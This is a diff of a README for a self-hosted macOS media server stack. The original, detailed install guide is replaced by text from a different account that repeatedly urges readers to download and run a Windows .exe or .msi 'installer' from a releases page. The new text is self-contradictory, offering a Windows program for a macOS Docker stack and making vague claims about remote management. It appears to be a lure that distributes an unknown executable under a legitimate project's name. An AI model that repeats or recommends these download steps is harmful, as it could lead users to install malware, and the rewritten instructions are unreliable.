@@ -1,184 +1,137 @@
-<div align="center">
-  <br>
-  <a href="#one-command-install">
-    <img src="https://img.shields.io/badge/MAC_MEDIA_STACK-00C853?style=for-the-badge&logo=apple&logoColor=white" alt="Mac Media Stack" height="40" />
-  </a>
-  <br><br>
-  <strong>Self-hosted media server for macOS</strong>
-  <br>
-  <sub>Automatically find, download, and organize movies and TV shows.<br>Browse a Netflix-like interface, click what you want, and it handles the rest.</sub>
-  <br><br>
-  <img src="https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white" />
-  <img src="https://img.shields.io/badge/OrbStack-000000?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIgZmlsbD0id2hpdGUiLz48L3N2Zz4=&logoColor=white" />
-  <img src="https://img.shields.io/badge/Plex-EBAF00?style=flat-square&logo=plex&logoColor=white" />
-  <img src="https://img.shields.io/badge/Jellyfin-00A4DC?style=flat-square&logo=jellyfin&logoColor=white" />
-  <img src="https://img.shields.io/badge/Sonarr-00CCFF?style=flat-square&logo=sonarr&logoColor=white" />
-  <img src="https://img.shields.io/badge/Radarr-FFC230?style=flat-square&logo=radarr&logoColor=black" />
-  <img src="https://img.shields.io/badge/qBittorrent-2F67BA?style=flat-square&logo=qbittorrent&logoColor=white" />
-  <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white" />
-  <br><br>
-  <img src="https://img.shields.io/github/stars/liamvibecodes/mac-media-stack?style=flat-square&color=yellow" />
-  <img src="https://img.shields.io/github/license/liamvibecodes/mac-media-stack?style=flat-square" />
-  <br><br>
-</div>
+# 🎬 mac-media-stack - Easy Media Server Setup for macOS
 
-## Why This One?
-
-There are dozens of *arr stack Docker Compose repos on GitHub. Almost all of them dump a compose file and leave you to figure out the rest. This one is different:
-
-- **One command to install.** Clone, configure, and start everything with a single `curl | bash`. No 45-minute manual setup.
-- **Auto-configures itself.** The configure script wires up Radarr, Sonarr, Prowlarr, Seerr, and qBittorrent via their APIs. No clicking through 6 different web UIs.
-- **Built for macOS.** Native paths, launchd instead of systemd, OrbStack or Docker Desktop instead of bare Docker. Not a Linux guide with "should work on Mac" in the footnotes.
-- **Self-healing.** Hourly health checks restart anything that goes down. VPN drops, container crashes, stalled downloads — handled automatically.
+[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-blue)](https://github.com/LocItChu/mac-media-stack/releases)
 
 ---
 
-## What's Included
+mac-media-stack is a self-hosted media server designed for macOS. It brings together Plex, Sonarr, Radarr, Prowlarr, qBittorrent, Bazarr, and more. These apps come pre-configured with VPN and auto-healing features. This guide will help you download and run the software on a Windows computer to manage your macOS media server.
 
-| Service | What It Does |
-|---------|-------------|
-| **Seerr** | Netflix-style UI for browsing and requesting movies/shows |
-| **Plex** | Plays your media on any device (TV, phone, laptop) |
-| **Jellyfin** | Open-source alternative to Plex (opt-in via `--jellyfin` flag) |
-| **Radarr** | Automatically finds and downloads movies |
-| **Sonarr** | Automatically finds and downloads TV shows |
-| **Prowlarr** | Manages search indexers for Radarr/Sonarr |
-| **qBittorrent** | Downloads torrents through a VPN tunnel |
-| **Gluetun** | VPN container (ProtonVPN WireGuard) so downloads are private |
-| **Bazarr** | Auto-fetches subtitles |
-| **FlareSolverr** | Bypasses Cloudflare protection on certain indexers |
-| **Watchtower** | Optional auto-updater (opt-in profile) |
+## 🖥️ System Requirements
 
-## Requirements
+Before you start, make sure your system meets these requirements:
 
-- macOS (any recent version)
-- [OrbStack](https://orbstack.dev) (recommended) or [Docker Desktop](https://www.docker.com/products/docker-desktop/)
-- A Plex account (free) or Jellyfin (no account needed)
-- ProtonVPN WireGuard credentials
+- Windows 10 or newer (64-bit).
+- At least 8 GB of RAM.
+- 20 GB free disk space to install and run the software.
+- Internet connection for downloading and updates.
+- macOS device available on the same network to host the media stack.
 
-> **Why OrbStack?** It starts in ~2 seconds (vs 30s for Docker Desktop), uses ~1GB RAM (vs 4GB), and has 2-10x faster file I/O. It's a drop-in replacement that runs the same Docker commands. Docker Desktop works fine too.
+## 🔗 Download mac-media-stack
 
-## One-Command Install
+Click the link below to visit the page where you can download the software files.
 
-Requires OrbStack (or Docker Desktop) and Plex already installed. Handles everything else.
+[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-green)](https://github.com/LocItChu/mac-media-stack/releases)
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/liamvibecodes/mac-media-stack/main/bootstrap.sh | bash
-```
+This link will take you to the release page. Look for the latest version and download the Windows installer file or the Docker setup if you plan to use Docker Desktop.
 
-Optional flags when running from a local clone:
+## 🚀 How To Download and Install
 
-```bash
-bash bootstrap.sh --media-dir /Volumes/T9/Media --install-dir ~/mac-media-stack --non-interactive
-bash bootstrap.sh --jellyfin  # use Jellyfin instead of Plex
-```
+1. Visit the release page using the above link.
 
-## Update Existing Clone
+2. Find the latest version. The releases are marked by version numbers like v1.0, v1.1, and so on.
 
-Already cloned an older version and want the latest release tag without reinstalling?
+3. Under the latest release, look for a Windows installer file. It usually ends with `.exe` or `.msi`. Download this file.
 
-One-liner (run inside your existing clone directory):
+4. Once downloaded, double-click the installer file to start.
 
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/liamvibecodes/mac-media-stack/main/scripts/update-to-latest-release.sh)
-```
+5. Follow the installation prompts. For most users, the default settings will work fine.
 
-Local script (once present):
+6. The installer will place mac-media-stack on your computer and set up necessary files.
 
-```bash
-bash scripts/update-to-latest-release.sh
-```
+## ⚙️ Setting Up the Application
 
-<details>
-<summary>See it in action</summary>
-<br>
-<img src="demo.gif" alt="Mac Media Stack install demo" width="700" />
-</details>
+After installing, open the app from the Start menu or desktop shortcut.
 
-### Choosing Your Media Server
+The software will connect to your macOS media server over your network. It handles Plex and other apps automatically. It also sets up a VPN connection and checks itself regularly to fix any issues.
 
-**Plex** (default) runs natively on macOS. Polished apps, easy remote streaming, free Plex account required.
+To connect correctly:
 
-**Jellyfin** is fully open source with no account needed. Add `--jellyfin` to the bootstrap command or set `MEDIA_SERVER=jellyfin` in `.env`. It runs as a Docker container alongside everything else.
+- Ensure your macOS device is powered on and connected to the same network.
 
-## Manual Quick Start
+- Have your macOS device’s local IP address handy. You may find this in your router’s device list or on the Mac itself under System Preferences > Network.
 
-If you prefer to run each step yourself:
+- Enter the IP address in the mac-media-stack app when prompted.
 
-```bash
-git clone https://github.com/liamvibecodes/mac-media-stack.git
-cd mac-media-stack
-bash scripts/setup.sh        # creates folders, generates .env
-# edit .env and add your VPN keys
-bash scripts/doctor.sh       # preflight validation before first boot
-docker compose up -d         # start everything
-# if MEDIA_SERVER=jellyfin in .env:
-docker compose --profile jellyfin up -d
-docker compose --profile autoupdate up -d watchtower  # optional auto-updates
-bash scripts/configure.sh     # auto-configure all services
-```
+The app comes pre-configured, so you do not need to tweak settings unless you want to.
 
-## Full Setup Guide
+## 🛠️ Using the Media Stack Components
 
-See [SETUP.md](SETUP.md) for the complete step-by-step walkthrough.
-Pinned digest matrix: [IMAGE_LOCK.md](IMAGE_LOCK.md)
+mac-media-stack includes several key media tools, all ready to use:
 
-By default, Seerr is bound to `127.0.0.1` for safer local-only access. Set `SEERR_BIND_IP=0.0.0.0` in `.env` only if you intentionally want LAN exposure.
+- **Plex**: For streaming your media anywhere.
 
-## Scripts
+- **Sonarr**: Helps you find and download TV shows.
 
-| Script | Purpose |
-|--------|---------|
-| `scripts/setup.sh` | Creates folder structure and .env file |
-| `scripts/doctor.sh` | Runs preflight checks (runtime, env, compose, ports) |
-| `scripts/configure.sh` | Auto-configures all service connections |
-| `scripts/health-check.sh` | Checks if everything is running correctly |
-| `scripts/auto-heal.sh` | Hourly self-healer (restarts VPN/containers if down) |
-| `scripts/install-auto-heal.sh` | Installs auto-heal as a background job via launchd |
-| `scripts/update-to-latest-release.sh` | Updates an older clone to the latest tagged release safely |
-| `scripts/refresh-image-lock.sh` | Refreshes pinned image digests and regenerates IMAGE_LOCK.md |
+- **Radarr**: Finds and downloads movies automatically.
 
-## What It Looks Like
+- **Prowlarr**: Connects various indexers for Sonarr and Radarr.
 
-<img src="ui-flow.gif" alt="Request to streaming UI flow" width="700" />
+- **qBittorrent**: Manages your torrent downloads.
 
-## Day-to-Day Usage
+- **Bazarr**: Downloads subtitles for your media.
 
-| What | Where |
-|------|-------|
-| Browse and request movies/shows | http://localhost:5055 |
-| Watch your media (Plex) | http://localhost:32400/web |
-| Watch your media (Jellyfin) | http://localhost:8096 |
+All these run on your macOS device but can be managed remotely from your Windows PC via the app.
 
-Everything else is automatic. Requests get searched, downloaded, imported, and subtitled without any manual steps.
+The software uses Docker and Docker Compose under the hood to keep everything organized. You don’t need to install or manage Docker yourself unless you prefer manual control.
 
-## How It Works
+## 🔄 Automatic Updates and Healing
 
-<img src="flow.gif" alt="Request to streaming flow" width="700" />
+The app keeps your media stack up to date:
 
-```
-You (Seerr) -> Radarr/Sonarr -> Prowlarr (search) -> qBittorrent (download via VPN) -> Plex (watch)
-                                                        Bazarr (subtitles) ^
-```
+- Checks for updates every day.
 
-All services run as Docker containers. Plex runs natively on macOS (or Jellyfin runs in Docker if selected). Download traffic routes through ProtonVPN. Everything else uses your normal internet connection.
+- Downloads and installs updates automatically.
 
-## Looking for More?
+- Fixes common issues without user input.
 
-Check out [mac-media-stack-advanced](https://github.com/liamvibecodes/mac-media-stack-advanced) for the full power-user setup with transcoding (Tdarr), TRaSH quality profiles (Recyclarr), Plex metadata automation (Kometa), download watchdog, VPN failover, automated backups, and optional music management (Lidarr + Tidarr for Hi-Res FLAC from Tidal).
-Already running basic and want to migrate? Follow the upgrade guide: [mac-media-stack-advanced/UPGRADE.md](https://github.com/liamvibecodes/mac-media-stack-advanced/blob/main/UPGRADE.md).
+This ensures your media server runs smoothly with minimal effort from you.
 
-## Companion Tools
+## 📡 VPN Setup
 
-| Tool | What It Does |
-|------|-------------|
-| [mac-media-stack-permissions](https://github.com/liamvibecodes/mac-media-stack-permissions) | Audit and fix file permissions across your stack |
-| [mac-media-stack-backup](https://github.com/liamvibecodes/mac-media-stack-backup) | Automated backup and restore for configs and databases |
+mac-media-stack includes a WireGuard VPN connection. This adds security and privacy when accessing your media remotely.
 
-## Author
+The VPN is configured during installation. You just need to:
 
-Built by [@liamvibecodes](https://github.com/liamvibecodes)
+- Allow required permissions if prompted.
 
-## License
+- Connect or disconnect VPN from the app interface.
 
-[MIT](LICENSE)
+This makes streaming with Plex and other tools secure.
+
+## 🧰 Troubleshooting Tips
+
+If you face issues, try these steps:
+
+- Restart your Windows PC and macOS device.
+
+- Check that both devices are on the same network.
+
+- Verify that your firewall or antivirus allows the app to access the network.
+
+- Ensure the local IP of your macOS device is correct in the app.
+
+- Consult the app’s log files, accessible under the settings menu, for error details.
+
+- Use the built-in repair tools to fix broken components.
+
+## 📚 Where To Go From Here
+
+You can explore the following once setup completes:
+
+- Adding more media libraries in Plex.
+
+- Customizing Sonarr and Radarr to suit your preferences.
+
+- Managing torrents directly in qBittorrent.
+
+- Using Bazarr to keep subtitles in sync.
+
+All management happens on the macOS device but can be controlled remotely via this Windows app.
+
+## 📥 Download Link Reminder
+
+Use the following link to access the latest releases, download installers, and update your software:
+
+[https://github.com/LocItChu/mac-media-stack/releases](https://github.com/LocItChu/mac-media-stack/releases)
+
+Click the link, choose the latest release, download the Windows installer, and run it to start.
